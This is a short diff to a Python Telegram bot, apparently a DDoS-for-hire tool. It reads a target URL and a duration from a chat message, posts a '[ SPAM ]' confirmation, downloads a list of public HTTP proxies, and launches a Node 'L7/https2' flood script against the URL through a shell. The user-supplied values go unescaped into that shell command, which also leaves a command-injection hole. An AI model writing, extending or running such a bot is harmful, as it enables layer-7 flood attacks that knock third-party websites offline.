@@ -50,6 +50,7 @@ def handle_message(message):
     floodtime = message.text.split(" ")[2]
     text = "𝙏𝙤𝙠𝙞𝙞𝙏𝙤𝙤𝙡𝙨 - 𝙏𝙧𝙖𝙣𝙓𝙪𝙖𝙣𝙎𝙤𝙣\n\n[ SPAM ]\n  • URL: "+url+"\n  • Thời Gian: "+floodtime+" Giây"
     bot.send_message(message.chat.id, text)
+    http_proxy = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
     with open("utils/http.txt", 'w') as p:
         p.write(httpx.get(http_proxy).text)
     subprocess.run([f'screen -dm node utils/L7/https2 {url} {floodtime} 1'], shell=True)
